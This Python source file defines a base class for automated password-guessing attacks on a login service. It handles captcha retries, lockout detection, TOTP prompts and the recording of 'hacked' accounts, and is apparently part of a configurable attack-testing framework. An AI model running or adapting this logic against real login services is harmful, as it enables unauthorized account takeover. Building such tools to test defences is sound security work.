# ============================================================
#                           Imports
# ============================================================
from core.attack_status import StopReason
from core.LoginResult import LoginResult


# ============================================================
#                        Base Attack Class
# ============================================================
class BaseAttack:
    """
    Base class for all attack types.
    Contains shared logic such as:
    - login attempts
    - captcha handling
    - success / lockout detection
    - attack expiration logic
    """

    # ========================================================
    #                       Constructor
    # ========================================================
    def __init__(
        self,
        client,
        timer,
        success_code,
        lockout_code,
        captcha_code,
        totp_code,
        max_time,
        max_attempts
    ):
        self.client = client
        self.timer = timer

        self.success_code = success_code
        self.lockout_code = lockout_code
        self.captcha_code = captcha_code
        self.totp_code = totp_code

        self.max_time = max_time
        self.max_attempts = max_attempts

        self.attempts = 0
        self.hacked = {}


    # ========================================================
    #                    Login Attempt Logic
    # ========================================================
    def attempt_login(self, user, password):
        """
        Attempts a login for a given user and password.
        Handles captcha retries, lockouts and TOTP cases.
        """

        # ----------------------------------------------------
        # Handle captcha if required
        # ----------------------------------------------------
        if user.captcha_required:
            user.captcha_token = self.client.handle_captcha(user.username)

        # ----------------------------------------------------
        # Send login request
        # ----------------------------------------------------
        response = self.client.login(
            user.username,
            password,
            user.captcha_token
        )

        if response is None:
            return LoginResult.FAILED

        # ----------------------------------------------------
        # Successful login
        # ----------------------------------------------------
        if response.status_code == self.success_code:
            self.handle_success(user, password)
            return LoginResult.SUCCESS

        # ----------------------------------------------------
        # Password correct, TOTP required
        # ----------------------------------------------------
        if response.status_code == self.totp_code:
            self.handle_success(user, password)
            return LoginResult.PARTIAL_SUCCESS

        # ----------------------------------------------------
        # Account locked
        # ----------------------------------------------------
        if response.status_code == self.lockout_code:
            user.locked = True
            return LoginResult.LOCKED

        # ----------------------------------------------------
        # Captcha required -> generate token and retry
        # ----------------------------------------------------
        if response.status_code == self.captcha_code:
            user.captcha_required = True
            return self.attempt_login(user, password)

        return LoginResult.FAILED


    # ========================================================
    #                   Success Handling
    # ========================================================
    def handle_success(self, user, password):
        """
        Marks the user as hacked and stores the result.
        """
        self.hacked[user.username] = (password, self.timer.elapsed())
        user.hacked = True


    # ========================================================
    #                   Attack Expiration Logic
    # ========================================================
    def attack_expired(self):
        """
        Checks whether the attack should stop due to
        time or attempt limits.
        """

        if self.timer.expired(self.max_time):
            return True, StopReason.TIME_EXPIRED

        if self.attempts >= self.max_attempts:
            return True, StopReason.MAX_ATTEMPTS

        return False, StopReason.NONE
